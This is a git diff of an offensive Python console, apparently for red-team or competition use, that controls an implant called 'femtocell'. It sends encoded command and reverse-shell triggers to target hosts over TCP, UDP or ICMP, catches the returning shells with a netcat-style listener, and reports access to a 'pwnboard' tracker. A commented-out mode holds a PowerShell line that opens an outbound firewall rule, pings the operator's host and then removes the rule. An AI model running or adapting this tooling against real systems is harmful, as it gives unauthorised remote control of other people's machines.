@@ -5,6 +5,7 @@ from prompt_toolkit import prompt
 from prompt_toolkit.history import FileHistory
 from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
 from termcolor import colored
+import nclib
 import os
 import confuse
 import socket, sys, time
@@ -12,17 +13,14 @@ import requests
 import multiprocessing
 from queue import Queue
 
-pwnboard = "http://pwnboard.win/pwn/boxaccess"
-
 parsedConfig = {}
 
-baseparams = {"MODE": "", "FILE": "", "XOR": True}
+baseparams = {"MODE": "", "FILE": "", "XOR": True, "PWNBOARD": ""}
 
 cmdparams = {
     "RHOST": "",
     "RPORT": 445,
-    "LHOST": "",
-    "COMMAND": "whoami",
+    "COMMAND": "msg * hi",
     "TRANSPORT": "TCP",
 }
 
@@ -38,8 +36,7 @@ groupparams = {
     "GROUP": "",
     "RHOST": "",
     "RPORT": 445,
-    "LHOST": "",
-    "COMMAND": "whoami",
+    "COMMAND": "msg * hi",
     "TRANSPORT": "TCP",
 }
 
@@ -47,64 +44,41 @@ groupparams = {
 def updatePwnboard(ip, mode):
     data = {"ip": ip, "application": "femtocell", "access_type": mode}
     try:
-        req = requests.post(pwnboard, json=data, timeout=3)
+        req = requests.post(baseparams["PWNBOARD"], json=data, timeout=3)
     except Exception as E:
         print(E)
 
 
-def listen(queue):
-    TIME_WAIT = 0.50
-    first = True
-
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    s.bind((shellparams["LHOST"], shellparams["LPORT"]))
-    s.listen(1)
-    conn, addr = s.accept()
-    print(colored(f"[+] Shell received from: {addr}\n", "green"))
-    updatePwnboard(shellparams["RHOST"], "shell")
-    while True:
-        ans = conn.recv(1024 * 128).decode()
-        sys.stdout.write(ans)
-
-        if first:
-            command = "\r"
-            first = False
-        else:
-            command = queue.get()
-
-        command += "\n"
-        conn.send(command.encode())
-        time.sleep(TIME_WAIT)
-
-        sys.stdout.write("\033[A" + ans.split("\n")[-1])
-        if command == "exit\n":
-            break
-
-    s.close()
+def listen():
+    nc = nclib.Netcat(listen=(shellparams["LHOST"], shellparams["LPORT"]))
+    nc.interact() # TODO does the connection close cleanly?
+    nc.close()
+    if baseparams["PWNBOARD"] != "": 
+        updatePwnboard(shellparams["RHOST"], "shell")
+    print(colored("\n[*] Shell closed.\n", "cyan"))
 
 
-def pingListen():
-    print(colored(f"[*] Waiting 15 seconds for callbacks.\n", "cyan"))
-    pkts = scapy.sniff(
-        iface="utun3", filter="icmp", timeout=15
-    ) 
-    tCallbacks = []
+# def pingListen():
+#     print(colored(f"[*] Waiting 15 seconds for callbacks.\n", "cyan"))
+#     pkts = scapy.sniff(
+#         iface="utun3", filter="icmp", timeout=15
+#     ) 
+#     tCallbacks = []
 
-    for packet in pkts:
-        if str(packet.getlayer(scapy.ICMP).type) == "8":
-            tCallbacks.append(packet[scapy.IP].src)
+#     for packet in pkts:
+#         if str(packet.getlayer(scapy.ICMP).type) == "8":
+#             tCallbacks.append(packet[scapy.IP].src)
 
-    fCallbacks = list(dict.fromkeys(tCallbacks))
-    for ip in fCallbacks:
-        print(colored(f"[+] Ping received from: {ip}\n", "green"))
-        updatePwnboard(ip, "beacon")
+#     fCallbacks = list(dict.fromkeys(tCallbacks))
+#     for ip in fCallbacks:
+#         print(colored(f"[+] Ping received from: {ip}\n", "green"))
+#         updatePwnboard(ip, "beacon")
 
 
-def initPing(params):
-    targetIP = params["LHOST"]
-    pingmode = "FC-CM-{}\00".format("powershell -c netsh adv f a r dir=out protocol=icmpv4 action=allow name=\"y\"; ping " + targetIP + " -n 1; netsh adv f delete rule name=\"y\"")
-    return pingmode
+# def initPing(params):
+#     targetIP = params["LHOST"]
+#     pingmode = "FC-CM-{}\00".format("powershell -c netsh adv f a r dir=out protocol=icmpv4 action=allow name=\"y\"; ping " + targetIP + " -n 1; netsh adv f delete rule name=\"y\"")
+#     return pingmode
 
 
 def validGroupKey():
@@ -215,8 +189,7 @@ def print_options(p):
         print(colored(f"{item}: {p[item]}", "cyan"))
     print()
 
-
-def main():
+def print_banner():
     print(
         """
     ____               __                  ____
@@ -229,6 +202,9 @@ def main():
 
     """
     )
+
+def main():
+    print_banner()
 
     if not os.path.exists("./history"):
         os.system("mkdir history")
@@ -248,11 +224,7 @@ def main():
             if user_cmd == "SET":
                 baseparams[op_1] = op_2
                 if op_1 == "MODE":
-                    if (
-                        baseparams["MODE"] == "SHELL"
-                        or baseparams["MODE"] == "CMD"
-                        or baseparams["MODE"] == "GROUP"
-                    ):
+                    if ( baseparams["MODE"] == "SHELL" or baseparams["MODE"] == "CMD" or baseparams["MODE"] == "GROUP"):
                         pass
                     else:
                         print(
@@ -275,6 +247,9 @@ def main():
                         )
                         continue
                     print(colored(f"[*] XOR set to {op_2}.\n", "cyan"))
+                elif op_1 == "PWNBOARD":
+                    op_2 = op_2.lower()
+                    print(colored(f"[*] Pwnboard URL set to {op_2}.\n", "cyan"))
         elif len(user_in) == 2:
             user_cmd = user_in[0]
             op_1 = user_in[1]
@@ -292,6 +267,8 @@ def main():
 
             if user_cmd == "EXIT":
                 exit()
+            elif user_cmd == "BANNER":
+                print_banner()
             elif user_cmd == "HELP":
                 print_help("base")
             elif user_cmd == "OPTIONS":
@@ -330,6 +307,8 @@ def ready(params):
 
             if user_cmd == "BACK" or user_cmd == "EXIT":
                 return
+            elif user_cmd == "BANNER":
+                print_banner()
             elif user_cmd == "OPTIONS":
                 print_options(params)
             elif user_cmd == "HELP":
@@ -348,22 +327,14 @@ def ready(params):
                 elif baseparams["MODE"] == "SHELL" and verify(shellparams):
                     plaintext = "FC-SH-{}\00".format(params["LHOST"])
                     ip = shellparams["RHOST"]
-                    queue = multiprocessing.Queue()
-                    t = multiprocessing.Process(target=listen, args=(queue,))
-                    t.start()
+                    t = multiprocessing.Process(target=listen)
+                    t.start() # start listener
                     print(colored(f"[*] Sending {plaintext[6:]} --> {ip}\n", "cyan"))
                     execute(plaintext, shellparams)
-                    command = "\r"
                     try:
-                        while command != "exit":
-                            command = input()
-                            queue.put(command)
-                        t.join()
+                        t.join() # wait until thread is finished
                     except KeyboardInterrupt:
                         t.terminate()
-                        print(colored(f"[-] No shell received.", "red"))
-                        continue
-                    print(colored("\n[*] Shell closed.\n", "cyan"))
                 elif baseparams["MODE"] == "GROUP" and verify(groupparams):
                     plaintext = "FC-CM-{}\00".format(params["COMMAND"])
                     if parsedConfig.get(groupparams.get("GROUP")) == "":
@@ -379,33 +350,33 @@ def ready(params):
                 else:
                     print_help("sub")
                     continue
-            elif user_cmd == "PING":
-                if baseparams["MODE"] == "CMD" and verify(cmdparams):
-                    plaintext = initPing(cmdparams)
-                    t = multiprocessing.Process(target=pingListen, args=())
-                    t.start()
-                    time.sleep(2)
-                    execute(plaintext, cmdparams)
-                    t.join()
-                elif baseparams["MODE"] == "GROUP" and verify(groupparams):
-                    if parsedConfig.get(groupparams.get("GROUP")) == "":
-                        continue
-                    groupList = getGroup()
-                    plaintext = initPing(groupparams)
-                    t = multiprocessing.Process(target=pingListen, args=())
-                    t.start()
-                    time.sleep(2)
-                    for iplist in groupList:
-                        for ip in iplist:
-                            groupparams["RHOST"] = ip
-                            e = multiprocessing.Process(target=execute, args=(plaintext,groupparams,))
-                            e.start()
-                    e.join()
-                    t.join()
+            # elif user_cmd == "PING": # under contruction
+            #     if baseparams["MODE"] == "CMD" and verify(cmdparams):
+            #         plaintext = initPing(cmdparams)
+            #         t = multiprocessing.Process(target=pingListen, args=())
+            #         t.start()
+            #         time.sleep(2)
+            #         execute(plaintext, cmdparams)
+            #         t.join()
+            #     elif baseparams["MODE"] == "GROUP" and verify(groupparams):
+            #         if parsedConfig.get(groupparams.get("GROUP")) == "":
+            #             continue
+            #         groupList = getGroup()
+            #         plaintext = initPing(groupparams)
+            #         t = multiprocessing.Process(target=pingListen, args=())
+            #         t.start()
+            #         time.sleep(2)
+            #         for iplist in groupList:
+            #             for ip in iplist:
+            #                 groupparams["RHOST"] = ip
+            #                 e = multiprocessing.Process(target=execute, args=(plaintext,groupparams,))
+            #                 e.start()
+            #         e.join()
+            #         t.join()
 
-                else:
-                    print(colored("[!] PING only works on GROUP or CMD mode.\n", "red"))
-                    continue
+                # else:
+                #     print(colored("[!] PING only works on GROUP or CMD mode.\n", "red"))
+                #     continue
             else:
                 print_help("sub")
                 continue
@@ -416,7 +387,7 @@ def ready(params):
 
             if user_cmd == "SET":
                 if op_1 in params.keys():
-                    if op_1 == "RPORT" or op_1 == "LPORT":
+                    if op_1 == "RPORT": 
                         op_2 = int(op_2)
                     elif op_1 == "GROUP" or op_1 == "COMMAND":
                         op_2 = op_2.lower()
@@ -448,11 +419,7 @@ def ready(params):
 def verify(params):
     passing = False
 
-    if (
-        params["TRANSPORT"] == "TCP"
-        or params["TRANSPORT"] == "UDP"
-        or params["TRANSPORT"] == "ICMP"
-    ):
+    if params["TRANSPORT"] in ["TCP", "UDP", "ICMP"]: 
         passing = True
     else:
         print(
@@ -464,7 +431,7 @@ def verify(params):
         print(colored("[!] RHOST required.\n", "red"))
         passing = False
 
-    if params["LHOST"] == "":
+    if baseparams["MODE"] == "SHELL" and params["LHOST"] == "":
         print(colored("[!] LHOST required.\n", "red"))
         passing = False
 
@@ -481,7 +448,7 @@ def execute(plaintext, params):
         payload = plaintext.encode()
 
     if params["TRANSPORT"] == "ICMP":
-        scapy.send(scapy.IP(dst=params["RHOST"].encode(), src=params["LHOST"].encode())/
+        scapy.send(scapy.IP(dst=params["RHOST"].encode())/
         scapy.ICMP(code=1, type=8)/
         payload, verbose=False)
         return
